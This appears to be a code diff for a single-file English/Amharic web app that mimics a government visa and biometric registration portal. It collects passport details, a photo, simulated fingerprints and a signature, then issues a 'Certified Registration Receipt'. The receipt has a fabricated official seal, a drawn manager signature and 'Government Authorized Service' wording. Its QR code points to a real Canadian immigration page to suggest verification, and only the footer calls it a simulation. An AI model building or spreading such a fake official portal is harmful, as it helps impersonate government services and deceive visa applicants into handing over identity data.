-                                <img id="receipt-applicant-sig" src="" class="h-12 mb-1 max-w-[160px] object-contain" alt="Applicant Signature">
-                                <div class="border-t border-slate-400 w-40 pt-1">
-                                    <p class="text-xs text-slate-500 font-semibold" data-i18n="applicantSignature">Applicant Signature</p>
-                                </div>
-                            </div>
-                            <div>
-                                <svg class="w-40 h-16 mb-1" viewBox="0 0 150 60">
-                                    <path d="M10,40 C20,10 40,50 60,30 C80,10 90,45 110,25 C120,15 130,35 140,20" stroke="#1e3a8a" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
-                                    <path d="M15,45 C30,20 50,40 70,35 C90,30 100,50 130,30" stroke="#1e3a8a" stroke-width="1.5" fill="none" stroke-linecap="round" opacity="0.6"/>
-                                </svg>
-                                <div class="border-t border-slate-400 w-40 pt-1">
-                                    <p class="text-xs text-slate-500 font-semibold" data-i18n="generalManager">General Manager</p>
-                                    <p class="text-xs text-slate-700 font-bold">Mr. Juliya Karon</p>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="official-stamp flex-shrink-0">
-                            <span>IMO<br>FORENSIC AND<br>MEDICAL<br>REGISTRATION</span>
-                        </div>
-                    </div>
-                    
-                    <div class="mt-8 pt-4 border-t border-slate-100 flex justify-between items-center">
-                        <p class="text-xs text-slate-400">Document generated electronically. No physical signature required.</p>
-                        <div id="qrcode" class="border border-slate-200 p-2 rounded bg-white"></div>
-                    </div>
-                </div>
-            </div>
+      <div class="scanner">
+        <div class="scanner-ring spin"></div>
+        <div class="scanner-ring spin rev"></div>
+        <div class="fingerprint-target" id="leftTarget" role="button" aria-label="fingerprint sensor">
+          <svg class="fp-icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--secondary)">
+            <path d="M32 6c-7 0-13 4-15 10-2 5-1 10 1 14 2 5 4 9 3 14-1 4-3 8-3 12"/>
+            <path d="M32 6c7 0 13 4 15 10 2 5 1 10-1 14-2 5-4 9-3 14 1 4 3 8 3 12"/>
+            <path d="M22 18c-2 4-2 8 0 12 2 4 3 8 2 12"/>
+            <path d="M42 18c2 4 2 8 0 12-2 4-3 8-2 12"/>
+            <path d="M27 14c-1 3-1 7 1 10 2 3 2 7 1 11"/>
+            <path d="M37 14c1 3 1 7-1 10-2 3-2 7-1 11"/>
+            <path d="M32 12c-1 3-1 6 0 9 1 3 1 6 0 9"/>
+          </svg>
+          <div class="fp-glow"></div>
+          <div class="scan-line"></div>
+          <div class="fp-tap-hint" data-i18n="tapHint">Tap to scan</div>
+        </div>
+      </div>
+
+      <div class="scan-progress" id="leftScanBar"><div class="scan-progress-bar" id="leftScanFill"></div></div>
+      <div class="finger-prompt" id="leftPrompt" data-i18n="leftPrompt">Place Left Thumb</div>
+      <div class="finger-help" id="leftHelp" data-i18n="leftHelp">Touch the sensor to begin automatic capture.</div>
+
+      <div class="finger-grid" id="leftGrid"></div>
+      <div class="finger-counter" data-i18n="counter">Progress: <b id="leftCount">0/5</b></div>
+    </div>
+  </section>
+
+  <!-- ============== SCREEN: STEP 3 - RIGHT HAND ============== -->
+  <section id="screen-step3" class="screen">
+    <div class="progress-wrap">
+      <div class="progress-label" data-i18n="step3Label">Step 3 of 3</div>
+      <div class="progress-track"><div class="progress-fill" id="progFill3" style="width:100%"></div></div>
+      <div class="progress-count">100%</div>
+    </div>
+    <div class="card biometric-stage">
+      <span class="ribbon" data-i18n="rightRibbon">Biometric Capture</span>
+      <h2 class="hand-title" style="margin-top:10px;" data-i18n="rightTitle">RIGHT HAND ENROLLMENT</h2>
+      <p class="hand-sub" data-i18n="rightSub">Continue with the right hand. Place each finger gently on the sensor.</p>
+
+      <div class="finger-status"><span class="dot"></span><span id="rightStatus" data-i18n="rightStatus">Awaiting — Place Right Thumb</span></div>
+
+      <div class="scanner">
+        <div class="scanner-ring spin"></div>
+        <div class="scanner-ring spin rev"></div>
+        <div class="fingerprint-target" id="rightTarget" role="button" aria-label="fingerprint sensor">
+          <svg class="fp-icon" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--secondary)">
+            <path d="M32 6c-7 0-13 4-15 10-2 5-1 10 1 14 2 5 4 9 3 14-1 4-3 8-3 12"/>
+            <path d="M32 6c7 0 13 4 15 10 2 5 1 10-1 14-2 5-4 9-3 14 1 4 3 8 3 12"/>
+            <path d="M22 18c-2 4-2 8 0 12 2 4 3 8 2 12"/>
+            <path d="M42 18c2 4 2 8 0 12-2 4-3 8-2 12"/>
+            <path d="M27 14c-1 3-1 7 1 10 2 3 2 7 1 11"/>
+            <path d="M37 14c1 3 1 7-1 10-2 3-2 7-1 11"/>
+            <path d="M32 12c-1 3-1 6 0 9 1 3 1 6 0 9"/>
+          </svg>
+          <div class="fp-glow"></div>
+          <div class="scan-line"></div>
+          <div class="fp-tap-hint" data-i18n="tapHint">Tap to scan</div>
+        </div>
+      </div>
+
+      <div class="scan-progress" id="rightScanBar"><div class="scan-progress-bar" id="rightScanFill"></div></div>
+      <div class="finger-prompt" id="rightPrompt" data-i18n="rightPrompt">Place Right Thumb</div>
+      <div class="finger-help" id="rightHelp" data-i18n="rightHelp">Touch the sensor to begin automatic capture.</div>
+
+      <div class="finger-grid" id="rightGrid"></div>
+      <div class="finger-counter" data-i18n="counter">Progress: <b id="rightCount">5/5</b></div>
+    </div>
+  </section>
+
+  <!-- ============== SCREEN: SIGNATURE ============== -->
+  <section id="screen-signature" class="screen">
+    <div class="progress-wrap">
+      <div class="progress-label" data-i18n="sigLabel">Step 4 of 4</div>
+      <div class="progress-track"><div class="progress-fill" style="width:100%"></div></div>
+      <div class="progress-count">100%</div>
+    </div>
+    <div class="card sig-stage">
+      <span class="ribbon gold" data-i18n="sigRibbon">Applicant Signature</span>
+      <h2 style="font-size:1.6rem; margin:10px 0 4px; text-align:center;" data-i18n="sigTitle">Please Sign Below</h2>
+      <p class="sig-instruction" data-i18n="sigInstr">Please sign inside the signature box below.</p>
+
+      <div class="sig-pad-wrap" id="sigPadWrap">
+        <canvas id="sigPad" class="sig-pad" width="1200" height="440"></canvas>
+        <div class="sig-x-line"></div>
+        <div class="sig-pad-hint" data-i18n="sigHint">Sign here</div>
+      </div>
+
+      <div class="sig-saved-badge" id="sigSavedBadge">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+        <span data-i18n="sigSaved">Signature saved</span>
+      </div>
+
+      <div class="sig-actions">
+        <button type="button" class="btn btn-ghost" id="clearSigBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>
+          <span data-i18n="sigClear">Clear Signature</span>
+        </button>
+        <button type="button" class="btn btn-gold" id="saveSigBtn" disabled>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
+          <span data-i18n="sigSave">Save Signature</span>
+        </button>
+        <button type="button" class="btn btn-success" id="continueAfterSigBtn" disabled>
+          <span data-i18n="sigContinue">Complete Registration</span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============== SCREEN: STEP 4 - SUCCESS ============== -->
+  <section id="screen-step4" class="screen">
+    <div class="card success-stage">
+      <div class="check-circle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+      </div>
+      <span class="ribbon green" data-i18n="doneRibbon">Registration Complete</span>
+      <h1 style="margin-top:12px;" data-i18n="doneTitle">Registration Successful</h1>
+      <p class="sub" data-i18n="doneSub">Your biometric enrollment has been completed and certified.</p>
+
+      <div class="check-list">
+        <div class="check-row"><div class="ck"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><span data-i18n="ck1">Biometric Enrollment Completed</span></div>
+        <div class="check-row"><div class="ck"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><span data-i18n="ck2">Applicant Successfully Registered</span></div>
+        <div class="check-row"><div class="ck"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div><span data-i18n="ck3">Certificate Ready for Download</span></div>
+      </div>
+
+      <div class="applicant-photo-frame" id="successPhotoFrame">
+        <svg viewBox="0 0 24 24" width="48" height="48" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      </div>
+      <div style="font-weight:800; color:var(--primary); font-size:1.1rem;" id="successName">—</div>
+      <div style="color:var(--muted); font-size:.85rem; margin-bottom:18px;" id="successPassport">—</div>
+
+      <div class="info-grid">
+        <div class="info-tile"><div class="k" data-i18n="kRegID">Registration ID</div><div class="v" id="successRegID">—</div></div>
+        <div class="info-tile"><div class="k" data-i18n="kDate">Registration Date</div><div class="v" id="successDate">—</div></div>
+        <div class="info-tile"><div class="k" data-i18n="kTime">Registration Time</div><div class="v" id="successTime">—</div></div>
+        <div class="info-tile"><div class="k" data-i18n="kPhone">Phone</div><div class="v" id="successPhone">—</div></div>
+        <div class="info-tile full"><div class="k" data-i18n="kNationality">Nationality</div><div class="v" id="successNationality">—</div></div>
+      </div>
+
+      <div class="actions center">
+        <button class="btn btn-primary" id="viewCertBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          <span data-i18n="viewCert">View Certified Receipt</span>
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============== SCREEN: STEP 5 - CERTIFICATE ============== -->
+  <section id="screen-receipt" class="screen">
+    <div class="card">
+      <div class="cert-toolbar">
+        <button class="btn btn-gold" id="downloadPdfBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+          <span data-i18n="dlPdf">Download Receipt as PDF</span>
+        </button>
+        <button class="btn btn-ghost" id="printBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+          <span data-i18n="printReceipt">Print Receipt</span>
+        </button>
+        <button class="btn btn-ghost" id="newRegBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7L3 8"/><polyline points="3 3 3 8 8 8"/></svg>
+          <span data-i18n="newReg">New Registration</span>
+        </button>
+      </div>
+
+      <article class="certificate" id="certificate">
+        <!-- Watermark -->
+        <div class="cert-watermark">
+          <svg viewBox="0 0 200 200" fill="none" stroke="#003a70" stroke-width="1.2">
+            <path d="M100 20 L40 50 V110 C40 150 70 175 100 180 C130 175 160 150 160 110 V50 Z"/>
+            <path d="M100 70v60M70 100h60" stroke-width="2.5"/>
+          </svg>
         </div>
 
-    </main>
+        <!-- Header -->
+        <div class="cert-header">
+          <div class="cert-logo">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2L3 5v7c0 5 3.8 9.4 9 10 5.2-.6 9-5 9-10V5l-9-3z"/>
+              <path d="M9 12h6M12 9v6"/>
+            </svg>
+          </div>
+          <div>
+            <div class="cert-title" data-i18n="brandTitle">IMO Forensic and Medical Registration</div>
+            <div class="cert-sub" data-i18n="certSub">Certified Registration Receipt</div>
+          </div>
+          <div class="cert-id">
+            <div class="k" data-i18n="kRegID">Registration ID</div>
+            <div class="v" id="certRegID">—</div>
+          </div>
+        </div>
 
-    <script>
-        // State
-        let currentLang = 'en';
-        let currentStep = 1;
-        let currentFingerIndex = 0;
-        let isScanning = false;
-        let applicantData = {};
+        <!-- Body -->
+        <div class="cert-body">
+          <div>
+            <div class="cert-section-title" data-i18n="secReg">Registration Information</div>
+            <div class="cert-row">
+              <div class="cert-field"><div class="k" data-i18n="kRegID">Registration ID</div><div class="v" id="certRegID2">—</div></div>
+              <div class="cert-field"><div class="k" data-i18n="kStatus">Status</div><div class="v"><span class="cert-status"><span class="d"></span><span data-i18n="statusCompleted">Completed</span></span></div></div>
+              <div class="cert-field"><div class="k" data-i18n="kDate">Registration Date</div><div class="v" id="certDate">—</div></div>
+              <div class="cert-field"><div class="k" data-i18n="kTime">Registration Time</div><div class="v" id="certTime">—</div></div>
+            </div>
 
-        const fingers = [
-            'leftThumb', 'leftIndex', 'leftMiddle', 'leftRing', 'leftLittle',
-            'rightThumb', 'rightIndex', 'rightMiddle', 'rightRing', 'rightLittle'
-        ];
+            <div class="cert-section-title" data-i18n="secApp">Applicant Information</div>
+            <div class="cert-row">
+              <div class="cert-field"><div class="k" data-i18n="lblName">Full Name</div><div class="v" id="certName">—</div></div>
+              <div class="cert-field"><div class="k" data-i18n="lblPassport">Passport Number</div><div class="v" id="certPassport">—</div></div>
+              <div class="cert-field"><div class="k" data-i18n="lblPhone">Phone Number</div><div class="v" id="certPhone">—</div></div>
+              <div class="cert-field"><div class="k" data-i18n="lblNationality">Nationality</div><div class="v" id="certNationality">—</div></div>
+            </div>
 
-        const translations = {
-            en: {
-                title: "IMO Forensic and Medical Registration",
-                step1: "Applicant Registration",
-                step2: "Biometric Enrollment",
-                step3: "Completion",
-                step4: "Registration Receipt",
-                fullName: "Full Name",
-                passportNumber: "Passport Number",
-                phoneNumber: "Phone Number",
-                nationality: "Nationality",
-                photoUpload: "Passport Photo Upload",
-                next: "Next",
-                scanning: "Scanning...",
-                completed: "Completed",
-                regSuccessful: "Registration Successful",
-                bioCompleted: "Biometric Enrollment Completed",
-                applicantRegistered: "Applicant Successfully Registered",
-                regId: "Registration ID",
-                regDate: "Registration Date",
-                regTime: "Registration Time",
-                status: "STATUS",
-                completedStatus: "COMPLETED",
-                downloadPdf: "Download Receipt as PDF",
-                printReceipt: "Print Receipt",
-                certification: "I hereby certify that the above information is true and correct.",
-                signature: "Digital Signature",
-                viewReceipt: "View Receipt",
-                startScan: "Touch scanner to begin",
-                leftThumb: "Left Thumb",
-                leftIndex: "Left Index",
-                leftMiddle: "Left Middle",
-                leftRing: "Left Ring",
-                leftLittle: "Left Little Finger",
-                rightThumb: "Right Thumb",
-                rightIndex: "Right Index",
-                rightMiddle: "Right Middle",
-                rightRing: "Right Ring",
-                rightLittle: "Right Little Finger",
-                digitalSignature: "Digital Signature",
-                clear: "Clear",
-                applicantSignature: "Applicant Signature",
-                generalManager: "General Manager"
-            },
-            am: {
-                title: "የ IMO ፎረንሲክ እና ህክምና ምዝገባ",
-                step1: "የአመልካች ምዝገባ",
-                step2: "ባዮሜትሪክ ምዝገባ",
-                step3: "ማጠናቀቅ",
-                step4: "የምዝገባ ደረሰኝ",
-                fullName: "ሙሉ ስም",
-                passportNumber: "የፓስፖርት ቁጥር",
-                phoneNumber: "ስልክ ቁጥር",
-                nationality: "ዜግነት",
-                photoUpload: "የፓስፖርት ፎቶ ይስቀሉ",
-                next: "ቀጣይ",
-                scanning: "እየተስተካከለ ነው...",
-                completed: "ተጠናቋል",
-                regSuccessful: "ምዝገባው ተሳክቷል",
-                bioCompleted: "ባዮሜትሪክ ምዝገባ ተጠናቋል",
-                applicantRegistered: "አመልካች በተሳካ ሁኔታ ተመዝግቧል",
-                regId: "የምዝገባ መታወቂያ",
-                regDate: "የምዝገባ ቀን",
-                regTime: "የምዝገባ ሰዓት",
-                status: "ሁኔታ",
-                completedStatus: "ተጠናቋል",
-                downloadPdf: "ደረሰኙን በ PDF ያውርዱ",
-                printReceipt: "ደረሰኙን ያትሙ",
-                certification: "ከላይ የተጠቀሰው መረጃ እውነት እና ትክክል መሆኑን እያረጋገጥኩ ነው።",
-                signature: "ዲጂታል ፊርማ",
-                viewReceipt: "ደረሰኝ ይመልከቱ",
-                startScan: "ለመጀመር ስካነሩን ይንኩ",
-                leftThumb: "የግራ እጅ አውራ ጣት",
-                leftIndex: "የግራ እጅ ጠቋሚ ጣት",
-                leftMiddle: "የግራ እጅ መካከለኛ ጣት",
-                leftRing: "የግራ እጅ ቀለበት ጣት",
-                leftLittle: "የግራ እጅ ሳግ ጣት",
-                rightThumb: "የቀኝ እጅ አውራ ጣት",
-                rightIndex: "የቀኝ እጅ ጠቋሚ ጣት",
-                rightMiddle: "የቀኝ እጅ መካከለኛ ጣት",
-                rightRing: "የቀኝ እጅ ቀለበት ጣት",
-                rightLittle: "የቀኝ እጅ ሳግ ጣት",
-                digitalSignature: "ዲጂታል ፊርማ",
-                clear: "አጽዳ",
-                applicantSignature: "የአመልካች ፊርማ",
-                generalManager: "አጠቃላይ ስራ አስኪያጅ"
-            }
-        };
+            <div class="cert-statement" data-i18n="certStatement">"This certifies that the applicant has successfully completed registration and biometric enrollment requirements."</div>
+          </div>
+          <div>
+            <div class="cert-photo" id="certPhotoFrame">
+              <svg viewBox="0 0 24 24" width="42" height="42" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            </div>
+          </div>
+        </div>
 
-        function toggleLanguage() {
-            currentLang = currentLang === 'en' ? 'am' : 'en';
-            document.getElementById('lang-btn-text').textContent = currentLang === 'en' ? 'Amharic' : 'English';
-            document.documentElement.lang = currentLang === 'en' ? 'en' : 'am';
-            updateTranslations();
-            if (currentStep === 2) {
-                updateFingerInstruction();
-            }
-        }
+        <!-- Footer: Applicant Sig | Seal+QR | General Manager Sig, with Date row -->
+        <div class="cert-footer">
+          <div class="cert-sig-row">
+            <!-- LEFT: Applicant Signature -->
+            <div class="cert-signature">
+              <div class="sig-img" id="applicantSigBox">
+                <span class="sig-empty" data-i18n="sigNoData">— no signature —</span>
+              </div>
+              <div class="name" data-i18n="appSigName">Applicant Signature</div>
+            </div>
+            <!-- CENTER: Official Seal + QR -->
+            <div class="cert-center">
+              <div class="cert-seal-wrap">
+                <!-- OFFICIAL SEAL SVG -->
+                <svg viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                  <defs>
+                    <path id="sealCirclePath" d="M 100,22 a 78,78 0 1,1 -0.1,0"/>
+                  </defs>
+                  <circle cx="100" cy="100" r="92" fill="none" stroke="#0a2a55" stroke-width="2.5" opacity=".85"/>
+                  <circle cx="100" cy="100" r="88" fill="none" stroke="#0a2a55" stroke-width="1" opacity=".55"/>
+                  <text font-family="Inter, sans-serif" font-weight="800" font-size="11" fill="#0a2a55" letter-spacing="2.5" opacity=".9">
+                    <textPath href="#sealCirclePath" startOffset="0%">IMO FORENSIC AND MEDICAL REGISTRATION • OFFICIAL CERTIFIED • </textPath>
+                  </text>
+                  <circle cx="100" cy="100" r="62" fill="none" stroke="#0a2a55" stroke-width="1.5" opacity=".75"/>
+                  <circle cx="100" cy="100" r="58" fill="none" stroke="#0a2a55" stroke-width="0.6" opacity=".5"/>
+                  <g opacity=".8" fill="#0a2a55">
+                    <path d="M52 120 C 45 105, 45 85, 55 70" stroke="#0a2a55" stroke-width="1.4" fill="none"/>
+                    <ellipse cx="49" cy="80" rx="3" ry="6" transform="rotate(-30 49 80)"/>
+                    <ellipse cx="47" cy="92" rx="3" ry="6" transform="rotate(-20 47 92)"/>
+                    <ellipse cx="47" cy="105" rx="3" ry="6" transform="rotate(-10 47 105)"/>
+                    <ellipse cx="50" cy="117" rx="3" ry="6" transform="rotate(0 50 117)"/>
+                  </g>
+                  <g opacity=".8" fill="#0a2a55">
+                    <path d="M148 120 C 155 105, 155 85, 145 70" stroke="#0a2a55" stroke-width="1.4" fill="none"/>
+                    <ellipse cx="151" cy="80" rx="3" ry="6" transform="rotate(30 151 80)"/>
+                    <ellipse cx="153" cy="92" rx="3" ry="6" transform="rotate(20 153 92)"/>
+                    <ellipse cx="153" cy="105" rx="3" ry="6" transform="rotate(10 153 105)"/>
+                    <ellipse cx="150" cy="117" rx="3" ry="6" transform="rotate(0 150 117)"/>
+                  </g>
+                  <path d="M100 60 L130 70 V100 C130 118 116 130 100 134 C84 130 70 118 70 100 V70 Z" fill="#0a2a55" opacity=".18" stroke="#0a2a55" stroke-width="1.5"/>
+                  <rect x="96" y="78" width="8" height="26" fill="#0a2a55" opacity=".95"/>
+                  <rect x="87" y="87" width="26" height="8" fill="#0a2a55" opacity=".95"/>
+                  <text x="100" y="156" text-anchor="middle" font-family="Inter, sans-serif" font-weight="900" font-size="11" fill="#0a2a55" letter-spacing="2">✓ CERTIFIED</text>
+                  <g fill="#0a2a55" opacity=".7">
+                    <polygon points="100,40 101.5,44 106,44 102.5,46.5 104,50.5 100,48 96,50.5 97.5,46.5 94,44 98.5,44"/>
+                  </g>
+                </svg>
+              </div>
+              <div class="cert-qr">
+                <div id="qrcode"></div>
+                <div class="qcap" data-i18n="qrCap">Scan to verify</div>
+              </div>
+            </div>
+            <!-- RIGHT: General Manager Signature -->
+            <div class="cert-signature gm">
+              <div class="sig-img">
+                <!-- Executive-style General Manager signature -->
+                <svg viewBox="0 0 220 80" xmlns="http://www.w3.org/2000/svg" aria-label="General Manager signature">
+                  <!-- Main flowing signature body -->
+                  <path d="M 14 50
+                    C 6 34, 18 18, 30 22
+                    C 40 26, 38 42, 28 46
+                    C 22 48, 18 42, 22 36
+                    C 30 30, 42 50, 52 42
+                    C 62 34, 70 22, 80 28
+                    C 90 34, 86 48, 76 50
+                    C 70 50, 68 46, 72 42
+                    C 80 36, 92 50, 102 44
+                    C 112 38, 118 26, 128 30
+                    C 138 34, 134 50, 122 52
+                    C 116 52, 114 48, 118 44
+                    C 126 38, 140 50, 150 44
+                    C 160 38, 164 30, 174 32
+                    C 186 36, 184 50, 170 52
+                    M 168 32
+                    C 178 22, 190 22, 200 30
+                    C 208 38, 204 50, 192 50
+                    C 186 50, 186 44, 192 42"
+                    fill="none" stroke="#0a2a55" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"/>
+                  <!-- Capital letter big flourish -->
+                  <path d="M 8 56 C 2 38, 8 14, 26 14 C 40 14, 38 34, 24 38"
+                    fill="none" stroke="#0a2a55" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+                  <!-- Trailing underline swoop -->
+                  <path d="M 14 64 C 70 72, 150 68, 210 60"
+                    fill="none" stroke="#0a2a55" stroke-width="1.3" stroke-linecap="round" opacity=".7"/>
+                  <!-- Period accent (middle initial) -->
+                  <circle cx="150" cy="48" r="1.7" fill="#0a2a55"/>
+                  <!-- Final loop flourish -->
+                  <path d="M 200 30 C 212 26, 218 36, 212 44"
+                    fill="none" stroke="#0a2a55" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" opacity=".85"/>
+                </svg>
+              </div>
+              <div class="name" data-i18n="gmName">General Manager</div>
+              <div class="role" data-i18n="gmRole">IMO Forensic and Medical Registration</div>
+            </div>
+          </div>
+          <div class="cert-date-row">
+            <div class="dt-cell">
+              <div class="k" data-i18n="kCertDate">Date of Certification</div>
+              <div class="dt" id="certDateSig1">—</div>
+            </div>
+            <div></div>
+            <div class="dt-cell">
+              <div class="k" data-i18n="kCertDate">Date of Certification</div>
+              <div class="dt" id="certDateSig2">—</div>
+            </div>
+          </div>
+        </div>
+      </article>
+    </div>
+  </section>
 
-        function updateTranslations() {
-            document.querySelectorAll('[data-i18n]').forEach(el => {
-                const key = el.getAttribute('data-i18n');
-                if (translations[currentLang][key]) {
-                    el.textContent = translations[currentLang][key];
-                }
-            });
-        }
+</main>
 
-        function getFingerName(index) {
-            const fingerKey = fingers[index];
-            return translations[currentLang][fingerKey];
-        }
+<div class="toast" id="toast">Saved</div>
 
-        function previewImage(input) {
-            if (input.files && input.files[0]) {
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const preview = document.getElementById('photo-preview');
-                    preview.src = e.target.result;
-                    preview.classList.remove('hidden');
-                };
-                reader.readAsDataURL(input.files[0]);
-            }
-        }
+<footer class="app-footer">
+  <b>IMO Forensic and Medical Registration</b> · <span data-i18n="footerTxt">Official Biometric Enrollment Portal — Simulation</span>
+</footer>
 
-        // Signature Canvas Logic
-        const canvas = document.getElementById('signature-canvas');
-        const ctx = canvas.getContext('2d');
-        let isDrawing = false;
-        let lastX = 0;
-        let lastY = 0;
+<script>
+/* ============================================================
+   IMO Forensic and Medical Registration — Simulator
+   Single-file vanilla JS application
+   ============================================================ */
 
-        ctx.strokeStyle = '#1e3a8a';
-        ctx.lineWidth = 2.5;
-        ctx.lineCap = 'round';
-        ctx.lineJoin = 'round';
+(function(){
+'use strict';
 
-        function getPos(e) {
-            const rect = canvas.getBoundingClientRect();
-            const scaleX = canvas.width / rect.width;
-            const scaleY = canvas.height / rect.height;
-            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-            return {
-                x: (clientX - rect.left) * scaleX,
-                y: (clientY - rect.top) * scaleY
-            };
-        }
+/* ============== QR DESTINATION CONFIG ============== */
+/**
+ * The URL the QR code encodes.
+ * When scanned, this must open a real, working web page.
+ * Default: official Canadian immigration information portal.
+ * To customize, replace with your company's:
+ *   - Verification portal
+ *   - Applicant tracking page
+ *   - Registration verification URL
+ *   - Corporate website
+ * MUST start with "https://" and be a fully-qualified URL.
+ */
+const QR_DESTINATION_URL = "https://www.canada.ca/en/immigration-refugees-citizenship.html";
 
-        function startDrawing(e) {
-            isDrawing = true;
-            const pos = getPos(e);
-            lastX = pos.x;
-            lastY = pos.y;
-            e.preventDefault();
-        }
+// Safety guard: validate URL at startup.
+(function validateQrUrl(){
+  try {
+    const u = new URL(QR_DESTINATION_URL);
+    if(u.protocol !== "https:") throw new Error("QR URL must use https://");
+    if(!u.hostname || u.hostname === "localhost" || u.hostname.startsWith("127.")) {
+      throw new Error("QR URL must not be localhost");
+    }
+    console.info("[QR] Destination URL OK:", QR_DESTINATION_URL);
+  } catch(e){
+    console.error("[QR] Invalid QR_DESTINATION_URL — must be a real https:// URL pointing to a live web page. Error:", e.message);
+  }
+})();
 
-        function draw(e) {
-            if (!isDrawing) return;
-            const pos = getPos(e);
-            ctx.beginPath();
-            ctx.moveTo(lastX, lastY);
-            ctx.lineTo(pos.x, pos.y);
-            ctx.stroke();
-            lastX = pos.x;
-            lastY = pos.y;
-            e.preventDefault();
-        }
+/* ============== i18n ============== */
+const I18N = {
+  en: {
+    brandTitle: "IMO Forensic and Medical Registration",
+    brandSub: "Official Biometric Enrollment Portal",
+    cCanada:"Canada", cUK:"United Kingdom", cUSA:"United States", cAUS:"Australia", cNZ:"New Zealand",
+    welcomeRibbon:"Government Authorized Service",
+    welcomeTitle:"Welcome to the Official Biometric Registration Portal",
+    welcomeDesc:"A secure, government-grade enrollment system for visa, immigration, forensic, and medical registration processing. Begin your application below.",
+    startBtn:"Begin Registration",
+    feat1Title:"Applicant Registration",
+    feat1Desc:"Submit your personal details and identity document information securely.",
+    feat2Title:"Biometric Enrollment",
+    feat2Desc:"Capture fingerprints from all ten fingers using advanced sensor simulation.",
+    feat3Title:"Official Certificate",
+    feat3Desc:"Receive a certified registration receipt with secure QR verification.",
+    step1Label:"Step 1 of 3", step2Label:"Step 2 of 3", step3Label:"Step 3 of 3",
+    step1Ribbon:"Applicant Information",
+    step1Title:"Personal & Identity Details",
+    step1Desc:"Please provide accurate information as it appears on your passport.",
+    lblName:"Full Name", lblPassport:"Passport Number", lblPhone:"Phone Number", lblNationality:"Nationality", lblPhoto:"Passport Photo",
+    phName:"As shown on your passport", phPassport:"e.g. PA1234567", phPhone:"+1 555 123 4567",
+    optSelect:"— Select nationality —",
+    photoUpB:"Upload Passport Photo", photoUpS:"JPG or PNG, max 5MB",
+    errName:"Please enter your full name.",
+    errPassport:"Please enter a valid passport number.",
+    errPhone:"Please enter your phone number.",
+    errNationality:"Please select your nationality.",
+    errPhoto:"Please upload a passport photo.",
+    btnBack:"Back", btnNext:"Continue to Biometrics",
+    leftRibbon:"Biometric Capture", leftTitle:"LEFT HAND ENROLLMENT",
